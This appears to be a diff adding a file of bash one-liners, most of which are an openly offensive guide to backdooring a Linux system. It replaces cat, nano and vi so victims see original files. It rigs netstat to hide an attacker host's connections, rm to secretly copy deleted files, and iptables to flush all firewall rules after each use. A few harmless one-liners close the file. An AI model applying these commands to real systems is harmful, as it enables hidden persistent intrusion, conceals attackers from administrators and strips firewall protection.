@@ -1,0 +1,74 @@
+### BASH One-liners
+###
+### A small culmination of quick & dirty bash commands
+
+
+
+
+
+###
+## Backdooring bash commands on a linux system (and hiding backdoors):
+###
+
+
+# First, backdoor programs that read information back to the user:
+
+# CAT
+# Backdoor cat to display the 'X.bak' versions of files, if they exist (in these examples, this is where the real commands are)
+# -- This way, if the victim tries to verify a command with cat, they will see the real command instead of our backdoored version
+cp /bin/cat /bin/cat.bak
+echo 'if [ -a "$1.bak" ]; then /bin/cat.bak "$1.bak"; else /bin/cat.bak $1; fi' > /bin/cat
+
+# NANO
+# Backdoor nano for the same purpose; if the victim attempts to verify one of these backdoored programs using nano, they will see the original program instead of the backdoored version.
+cp /bin/nano /bin/nano.bak
+echo 'if [ -a "$1.bak" ]; then /bin/nano.bak "$1.bak"; else /bin/nano.bak $1; fi' > /bin/nano
+
+# VI
+# Backdoor vi for the same purpose as nano.
+cp /usr/bin/vi /usr/bin/vi.bak
+echo 'if [ -a "$1.bak" ]; then /usr/bin/vi.bak "$1.bak"; else /usr/bin/vi.bak $1; fi' > /usr/bin/vi
+
+# NOTE: in nano and vi, the title will display the actual file name (X.bak).
+
+
+# Now, change any other commands you want, using the same 'X.bak' format and without the above programs, the user will have limited options to verify whether the command is safe/valid. Some examples/ideas:
+
+# NETSTAT
+# Backdoor netstat to omit lines with an attacker's IP address
+# -- If the victim runs netstat to check network connections, they will not see an attacker's connection
+cp /bin/netstat /bin/netstat.bak
+echo '/bin/netstat.bak $1 | grep -v <evilhost_ip>' > /bin/netstat
+
+# RM
+# copies a file to /etc/ (change to whatever you want) before removing the file
+cp /bin/rm /bin/rm.bak
+echo 'cp $1 /etc/ >/dev/null 2>&1 && /bin/rm.bak $1' > /bin/rm
+
+# NOTE: -r option doesnt work... but output is suppressed with ">/dev/null 2>&1" so...
+
+# IPTABLES
+# runs iptables command normally and then flushes all rules immediately afterwards
+cp /sbin/iptables /sbin/iptables.bak
+echo '/sbin/iptables.bak iptables $1 && /sbin/iptables.bak iptables -F >/dev/null 2>&1' > /sbin/iptables
+
+
+
+
+
+###
+## Miscellaneous
+###
+
+
+# Reverse the names of all files in the current directory (append "cd /whatever/directory/ && " to the beginning to reverse a particular directory):
+for f in *; do mv $f "$(echo $f | rev)"; done
+
+
+# Make a rainbow cow tell you a random fortune every time you open a terminal window (works in Kali):
+echo '/usr/games/cowsay `/usr/games/fortune` | /usr/games/lolcat' >> ~/.bashrc
+
+
+
+# Resolve a list of hostnames (one hostname per-line in a text file 'listofhostnames.txt'):
+while read p; do printf "%30s..." "$p"; nslookup $p | sed -n -e 's/^.*Address: //p'; done < listofhostnames.txt
